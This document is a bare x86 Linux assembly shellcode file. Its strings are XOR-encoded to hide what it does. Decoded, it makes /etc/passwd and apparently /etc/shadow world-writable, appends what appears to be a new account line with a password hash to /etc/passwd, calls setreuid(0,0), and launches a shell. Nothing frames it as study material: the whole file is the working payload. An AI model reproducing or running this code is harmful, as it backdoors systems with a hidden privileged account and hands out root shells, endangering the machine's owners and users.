global _start


section .text

_start:

;xor eax,eax
xor ebx,ebx
xor ecx,ecx
mul ebx
;xor edx,edx
mov ebx,0x534f4559
mov edx,0x37383633
xor ebx,edx
push ebx
shr ebx,byte 0x8
push ebx
mov ebx,0x4559467a
mov edx,0x36383655
xor ebx,edx
push ebx
mov ebx,0x4e455867
mov edx,0x2d313d48
xor ebx,edx
push ebx
mov ebx,esp
push dword 0x1ff4141
pop ecx
shr ecx,byte 0x8
shr ecx,byte 0x8
push byte +0xf
pop eax
int 0x80
mov ebx,0x4a574953
mov edx,0x3d382d39
xor ebx,edx
shr ebx,byte 0x8
push ebx
mov ebx,0x5845476d
mov edx,0x392d3442
xor ebx,edx
push ebx
mov ebx,0x5749546e
mov edx,0x343d3141
xor ebx,edx
push ebx
mov ebx,esp
push dword 0x1ff4141
pop ecx
shr ecx,byte 0x8
shr ecx,byte 0x8
push byte +0xf
pop eax
int 0x80
mov ebx,0x514e4773
mov edx,0x35393432
xor ebx,edx
shr ebx,byte 0x8
push ebx
mov ebx,0x44564459
mov edx,0x37373476
xor ebx,edx
push ebx
mov ebx,0x5159584e
mov edx,0x322d3d61
xor ebx,edx
push ebx
mov ebx,esp
push dword 0x4014141
pop ecx
shr ecx,byte 0x8
shr ecx,byte 0x8
push byte +0x5
pop eax
int 0x80
mov ebx,eax
push byte +0x4
pop eax
push dword 0xa687341
pop ecx
shr ecx,byte 0x8
push ecx
mov ecx,0x58576757
mov edx,0x39354839
xor ecx,edx
push ecx
mov ecx,0x515a644e
mov edx,0x38384b74
xor ecx,edx
push ecx
mov ecx,0x42565747
mov edx,0x36393835
xor ecx,edx
push ecx
mov ecx,0x4e517061
mov edx,0x616b392d
xor ecx,edx
push ecx
mov ecx,0x74705848
mov edx,0x354a6872
xor ecx,edx
push ecx
mov ecx,0x46564576
mov edx,0x766c6b3d
xor ecx,edx
push ecx
push dword 0x57557766
push dword 0x50317068
push dword 0x4165597a
push dword 0x51416141
push dword 0x74753849
push dword 0x68594d50
push dword 0x7a744254
push dword 0x54382f51
push dword 0x676d3645
push dword 0x732e5076
push dword 0x3752584e
push dword 0x48554b39
push dword 0x42592f72
push dword 0x474b7856
push dword 0x5a665539
push dword 0x686a5646
push dword 0x79386346
push dword 0x716a5970
push dword 0x68536977
push dword 0x5467546e
push dword 0x37694d58
push dword 0x246e412f
push dword 0x4d6e5570
push dword 0x6a243624
mov ecx,0x67746173
mov edx,0x5d3d2d32
xor ecx,edx
push ecx
mov ecx,esp
mov edx,0x7f414141
shr edx,byte 0x8
shr edx,byte 0x8
shr edx,byte 0x8
int 0x80
xor eax,eax
mov al,0x46
xor ebx,ebx
xor ecx,ecx
int 0x80
xor eax,eax
mov al,0x46
xor ebx,ebx
xor ecx,ecx
int 0x80
push dword 0x42485552
push dword 0x43495152
mov ecx,0x77594b49
mov edx,0x35313866
xor ecx,edx
push ecx
mov ecx,0x57545555
mov edx,0x393d377a
xor ecx,edx
push ecx
mov ebx,esp
xor eax,eax
mov [ebx+0x7],al
mov [ebx+0x8],ebx
mov [ebx+0xc],eax
mov al,0xb
lea ecx,[ebx+0x8]
lea edx,[ebx+0xc]
int 0x80
mov al,0x1
mov bl,0x1
int 0x80

